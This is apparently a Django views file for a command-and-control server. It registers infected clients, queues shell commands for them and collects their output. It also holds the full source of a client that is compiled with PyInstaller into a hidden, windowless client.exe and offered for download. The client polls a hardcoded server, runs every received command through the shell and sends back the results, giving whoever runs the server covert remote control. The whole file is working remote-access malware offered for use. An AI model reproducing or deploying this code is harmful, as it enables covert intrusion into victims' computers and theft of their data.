import os
import time
import subprocess
import shutil
import uuid
from django.conf import settings
from django.http import FileResponse
from django.shortcuts import render
from django.utils import timezone
from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework import status
from .models import Client
from .serializers import ClientSerializer

def index(request):
    clients = Client.objects.all()
    return render(request, 'index.html', {'clients': clients})

class ClientRegisterView(APIView):
    def post(self, request):
        client_id = request.data.get('client_id')
        token = request.data.get('token')
        if not client_id or not token:
            return Response({'error': 'client_id and token required'}, status=status.HTTP_400_BAD_REQUEST)
        client, created = Client.objects.get_or_create(client_id=client_id, defaults={'token': token})
        client.last_seen = timezone.now()  # به‌روزرسانی زمان
        client.save()
        serializer = ClientSerializer(client)
        return Response(serializer.data, status=status.HTTP_201_CREATED if created else status.HTTP_200_OK)

class ClientCommandView(APIView):
    def post(self, request, client_id):
        try:
            client = Client.objects.get(client_id=client_id)
            command = request.data.get('command')
            if not command:
                return Response({'error': 'command required'}, status=status.HTTP_400_BAD_REQUEST)
            client.last_command = command
            client.command_id = uuid.uuid4()
            client.last_seen = timezone.now()  # به‌روزرسانی زمان
            client.save()
            return Response({'status': 'command sent', 'command_id': str(client.command_id)}, status=status.HTTP_200_OK)
        except Client.DoesNotExist:
            return Response({'error': 'client not found'}, status=status.HTTP_404_NOT_FOUND)

class ClientPollView(APIView):
    def get(self, request, client_id):
        try:
            client = Client.objects.get(client_id=client_id)
            client.last_seen = timezone.now()  # به‌روزرسانی زمان
            client.save()
            serializer = ClientSerializer(client)
            return Response(serializer.data, status=status.HTTP_200_OK)
        except Client.DoesNotExist:
            return Response({'error': 'client not found'}, status=status.HTTP_404_NOT_FOUND)

    def post(self, request, client_id):
        try:
            client = Client.objects.get(client_id=client_id)
            output = request.data.get('output')
            if output:
                client.last_output = output
                client.last_command = None
                client.command_id = None
                client.last_seen = timezone.now()  # به‌روزرسانی زمان
                client.save()
            return Response({'status': 'output received'}, status=status.HTTP_202_ACCEPTED)
        except Client.DoesNotExist:
            return Response({'error': 'client not found'}, status=status.HTTP_404_NOT_FOUND)

def cmd_page(request, client_id):
    try:
        client = Client.objects.get(client_id=client_id)
        return render(request, 'cmd.html', {'client': client})
    except Client.DoesNotExist:
        return render(request, 'cmd.html', {'error': 'کلاینت یافت نشد'})

def generate_exe(request):
    try:
        folder_path = os.path.join(settings.BASE_DIR, 'APP_WEB_HACK')
        os.makedirs(folder_path, exist_ok=True)

        client_code = """
import os
import getpass
import requests
import json
import uuid
import subprocess
import time
import logging
import re

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

SERVER_URL = "http://192.168.1.100:8000/api/"
CLIENT_ID = getpass.getuser()
TOKEN = str(uuid.uuid4())
CURRENT_DIR = os.getcwd()

def register_client():
    try:
        response = requests.post(f"{SERVER_URL}register/", json={'client_id': CLIENT_ID, 'token': TOKEN})
        response.raise_for_status()
        logger.info(f"Registered: {response.json()}")
    except Exception as e:
        logger.error(f"Registration failed: {e}")

def poll_server():
    last_command_id = None
    global CURRENT_DIR
    while True:
        try:
            response = requests.get(f"{SERVER_URL}poll/{CLIENT_ID}/")
            response.raise_for_status()
            data = response.json()
            command = data.get('last_command')
            command_id = data.get('command_id')
            if command and command_id and command_id != last_command_id:
                logger.info(f"Received command: {command} (ID: {command_id})")
                output = ""
                # مدیریت تغییر درایو (مثل D:)
                drive_match = re.match(r'^([a-zA-Z]):$', command.strip())
                if drive_match:
                    drive = drive_match.group(1) + ':'
                    try:
                        os.chdir(drive + '\\\\')
                        CURRENT_DIR = os.getcwd()
                        output = f"Changed drive to {drive}"
                    except Exception as e:
                        output = f"Error changing drive: {e}"
                # مدیریت دستور cd
                elif command.strip().lower().startswith('cd '):
                    new_dir = command[3:].strip()
                    try:
                        os.chdir(new_dir)
                        CURRENT_DIR = os.getcwd()
                        output = f"Changed directory to {CURRENT_DIR}"
                    except Exception as e:
                        output = f"Error changing directory: {e}"
                # اجرای فایل‌های EXE یا دستورات دیگر
                else:
                    try:
                        # چک کردن اگر دستور فایل EXE است
                        if command.lower().endswith('.exe'):
                            command = f'"{os.path.join(CURRENT_DIR, command.strip())}"'
                        result = subprocess.run(
                            command,
                            shell=True,
                            capture_output=True,
                            text=True,
                            encoding='utf-8',
                            cwd=CURRENT_DIR
                        )
                        output = result.stdout + result.stderr
                        if result.returncode != 0:
                            output = output + "\\nError: Command failed with exit code " + str(result.returncode)
                    except Exception as e:
                        output = f"Error executing command: {str(e)}"
                response = requests.post(
                    f"{SERVER_URL}poll/{CLIENT_ID}/",
                    json={'output': output}
                )
                response.raise_for_status()
                logger.info(f"Sent output: {output[:100]}...")
                last_command_id = command_id
        except Exception as e:
            logger.error(f"Poll failed: {e}")
        time.sleep(1)
    return

if __name__ == "__main__":
    time.sleep(1)
    register_client()
    poll_server()
"""
        client_path = os.path.join(folder_path, 'client.py')
        with open(client_path, 'w', encoding='utf-8') as f:
            f.write(client_code)

        exe_path = os.path.join(folder_path, 'client.exe')
        icon_path = os.path.join(settings.BASE_DIR, 'icon.ico')
        for _ in range(5):
            try:
                if os.path.exists(exe_path):
                    os.chmod(exe_path, 0o666)
                    os.remove(exe_path)
                break
            except PermissionError:
                time.sleep(2)
        else:
            raise PermissionError("نمی‌توان فایل client.exe را حذف کرد، احتمالاً در حال اجرا است.")

        for attempt in range(3):
            try:
                pyinstaller_cmd = [
                    'pyinstaller', '--onefile', '--noconsole', '--distpath', folder_path, '--specpath', folder_path
                ]
                if os.path.exists(icon_path):
                    pyinstaller_cmd.append(f'--icon={icon_path}')
                pyinstaller_cmd.append(client_path)
                subprocess.run(pyinstaller_cmd, check=True, shell=True)
                break
            except subprocess.CalledProcessError as e:
                if attempt < 2:
                    time.sleep(2)
                    continue
                raise e

        shutil.rmtree(os.path.join(folder_path, 'build'), ignore_errors=True)
        spec_path = os.path.join(folder_path, 'client.spec')
        if os.path.exists(spec_path):
            os.remove(spec_path)
        if os.path.exists(client_path):
            os.remove(client_path)

        return render(request, 'index.html', {
            'clients': Client.objects.all(),
            'message': 'فایل client.exe با موفقیت در پوشه APP_WEB_HACK ساخته شد!'
        })
    except Exception as e:
        return render(request, 'index.html', {
            'clients': Client.objects.all(),
            'message': f'خطا در ساخت exe: {str(e)}'
        })

def download_exe(request):
    exe_path = os.path.join(settings.BASE_DIR, 'APP_WEB_HACK', 'client.exe')
    if os.path.exists(exe_path):
        return FileResponse(open(exe_path, 'rb'), as_attachment=True, filename='client.exe')
    else:
        return render(request, 'index.html', {
            'clients': Client.objects.all(),
            'message': 'خطا: فایل client.exe یافت نشد. لطفاً ابتدا فایل را بسازید.'
        })